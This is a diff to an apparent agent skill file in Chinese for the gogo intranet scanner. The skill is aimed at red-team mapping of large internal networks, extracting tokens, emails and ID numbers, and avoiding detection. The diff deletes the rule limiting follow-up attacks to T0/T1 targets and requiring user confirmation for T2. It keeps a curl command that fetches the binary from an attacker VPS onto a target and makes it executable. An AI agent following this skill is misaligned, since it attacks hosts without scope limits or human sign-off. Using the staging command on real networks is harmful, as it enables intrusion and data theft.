@@ -1,16 +1,12 @@
 ---
 name: gogo-intranet
-description: 【内网】gogo v2.15.0 高性能内网扫描引擎：智能/超智能模式、主动+被动指纹、关键信息提取（title/cert/JWT/邮箱/身份证）、nuclei 模板 POC、发包可控低噪声
+description: gogo v2.15.0 高性能内网扫描引擎：智能/超智能模式、主动+被动指纹、关键信息提取（title/cert/JWT/邮箱/身份证）、nuclei 模板 POC、发包可控低噪声
 whenToUse: 进入内网后对大网段（/16 /12）快速测绘、要指纹与关键信息、需要尽量少发包不被发现
 role: internal
-category: 内网
-tags: [internal, scan, fingerprint]
 enabled: true
 ---
 
 # gogo（内网测绘与指纹引擎）
-
-> 内网段扫描会看到别的单位/旁站：只对 **T0/T1** 做后续攻击；T2 需用户确认，T3 不碰。
 
 `gogo` = **高并发、低噪声、高度可配置的测绘引擎**。链式反应出品，专为红队内网场景设计：
 最小发包原则、主动+被动指纹、关键信息提取、内核级 POC 引擎（neutron，兼容 nuclei 模板）、
@@ -32,10 +28,14 @@ enabled: true
        $DSH_HOME/redteam/toolkit/gogo/gogo_windows_amd64.exe
        $DSH_HOME/redteam/toolkit/gogo/gogo_linux_arm64
 VPS  : http://<你的VPS_IP>:9100/gogo                          （技能 vps-reverse-shell 的载荷目录）
+文档 : https://chainreactors.github.io/wiki/gogo/
+模板 : https://github.com/chainreactors/templates
 
 # 跳到跳板机/目标上执行
 curl -o gogo http://<你的VPS_IP>:9100/gogo && chmod +x gogo
 ```
+
+安装脚本不下载 gogo，需自行放到主文件路径。Windows 与 ARM 文件同样要自己补；当前平台只用上面的主文件。
 
 **零依赖**：单个静态二进制，指纹与提取规则全部内置，Windows 2003 都能跑。**不需要**额外配置文件。
 
